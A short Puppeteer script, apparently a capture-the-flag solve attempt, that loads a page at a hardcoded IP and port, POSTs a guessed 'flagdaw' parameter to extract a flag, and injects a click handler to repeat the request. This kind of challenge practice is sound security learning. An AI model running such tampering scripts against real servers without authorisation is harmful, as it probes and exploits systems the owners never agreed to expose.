const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  try {
    // Navigate to the page
    await page.goto('http://49.213.52.6:6969/');
    
    // Try with lowercase flagdaw
    const response = await page.evaluate(async () => {
      const res = await fetch('/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ flagdaw: true })
      });
      return await res.text();
    });
    
    console.log('Response with flagdaw:', response);
    
    // Also try modifying the page to use flagdaw
    await page.evaluate(() => {
      const button = document.getElementById('button');
      button.addEventListener('click', async () => {
        const flag = await fetch('/', {
          method: 'POST',
          body: JSON.stringify({ flagdaw: true }),
        }).then((r) => r.text());
        console.log('Flag:', flag);
      });
    });
    
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

